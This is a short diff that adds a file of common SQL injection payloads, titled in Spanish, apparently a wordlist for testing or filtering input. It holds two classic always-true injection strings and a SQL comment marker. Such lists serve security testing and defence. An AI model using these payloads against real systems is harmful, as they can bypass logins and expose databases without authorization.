@@ -1,0 +1,4 @@
+# Payloads SQLi comunes
+' OR '1'='1
+" OR "1"="1
+--
